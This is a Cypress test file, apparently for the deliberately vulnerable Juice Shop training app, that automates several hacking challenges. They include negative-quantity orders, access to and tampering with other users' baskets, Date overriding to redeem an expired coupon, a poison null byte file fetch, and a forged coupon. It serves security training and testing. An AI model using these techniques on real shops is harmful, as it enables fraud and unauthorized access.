describe('/#/basket', () => {
  // Helper method for API calls with typed options
  const apiCall = async (
    url: string,
    method: 'GET' | 'POST' | 'PUT' | 'DELETE',
    body: Record<string, any> | null = null
  ): Promise<Response> => {
    const headers: HeadersInit = {
      'Content-type': 'application/json',
      Authorization: `Bearer ${localStorage.getItem('token') || ''}`,
    }

    const options: RequestInit = { method, cache: 'no-cache', headers }
    if (body) options.body = JSON.stringify(body)

    return await fetch(`${Cypress.config('baseUrl')}${url}`, options)
  }

  const setCouponPanelState = (state: boolean) => {
    cy.window().then(() => {
      window.localStorage.setItem('couponPanelExpanded', JSON.stringify(state))
    })
  }

  const solveChallenge = (challengeName: string) => {
    cy.expectChallengeSolved({ challenge: challengeName })
  }

  describe('as admin', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })

    describe('challenge "negativeOrder"', () => {
      it('should update a basket to a negative quantity via the Rest API', () => {
        cy.window().then(async () => {
          const response = await apiCall('/api/BasketItems/1', 'PUT', { quantity: -100000 })
          if (response.ok) console.log('Basket updated successfully')
        })

        cy.visit('/#/order-summary')
        cy.get('mat-cell.mat-column-quantity > span')
          .first()
          .invoke('text')
          .should('match', /-100000/)
      })

      it('should place an order with a negative total amount', () => {
        cy.visit('/#/order-summary')
        cy.get('#checkoutButton').click()
        solveChallenge('Payback Time')
      })
    })

    describe('challenge "basketAccessChallenge"', () => {
      it('should access basket with ID from session storage', () => {
        cy.window().then(() => {
          window.sessionStorage.setItem('bid', '3')
        })

        cy.visit('/#/basket')
        solveChallenge('View Basket')
      })
    })

    describe('challenge "basketManipulateChallenge"', () => {
      it('should manipulate another user’s basket', () => {
        cy.window().then(async () => {
          await apiCall('/api/BasketItems/', 'POST', {
            ProductId: 14,
            BasketId: 2,
            quantity: 1,
          })
        })

        solveChallenge('Manipulate Basket')
      })
    })
  })

  describe('as jim', () => {
    beforeEach(() => {
      cy.login({ email: 'jim', password: 'ncc-1701' })
    })

    describe('challenge "manipulateClock"', () => {
      it('should use an expired coupon to place an order', () => {
        setCouponPanelState(false)
        cy.visit('/#/payment/shop')

        cy.window().then((win) => {
          cy.on('uncaught:exception', () => false) // Suppress exceptions from Date manipulation
          win.eval(`
            const event = new Date("March 08, 2019 00:00:00");
            Date = function(Date) { return function() { return event; }}(Date);
          `)
        })

        cy.get('#collapseCouponElement').click()
        cy.get('#coupon').type('WMNSDY2019')
        cy.get('#applyCouponButton').click()
        cy.get('.mat-radio-inner-circle').first().click()
        cy.get('.nextButton').click()
        cy.get('#checkoutButton').click()
        solveChallenge('Expired Coupon')
      })
    })

    describe('challenge "forgedCoupon"', () => {
      it('should access a file using poison null byte attack', () => {
        cy.request(`${Cypress.config('baseUrl')}/ftp/coupons_2013.md.bak%2500.md`)
      })

      it('should add a product to the basket', () => {
        cy.window().then(async () => {
          const bid = sessionStorage.getItem('bid')
          await apiCall('/api/BasketItems/', 'POST', {
            BasketId: bid,
            ProductId: 1,
            quantity: 1,
          })
        })
      })

      it('should apply an 80% discount coupon', () => {
        setCouponPanelState(false)
        cy.visit('/#/payment/shop')
        cy.get('#collapseCouponElement').click()

        cy.task<string>('GenerateCoupon', 90).then((coupon: string) => {
          cy.get('#coupon').type(coupon)
          cy.get('#applyCouponButton').click()
        })
      })

      it('should place an order with a forged coupon', () => {
        cy.visit('/#/order-summary')
        cy.get('#checkoutButton').click()
        solveChallenge('Forged Coupon')
      })
    })
  })
})
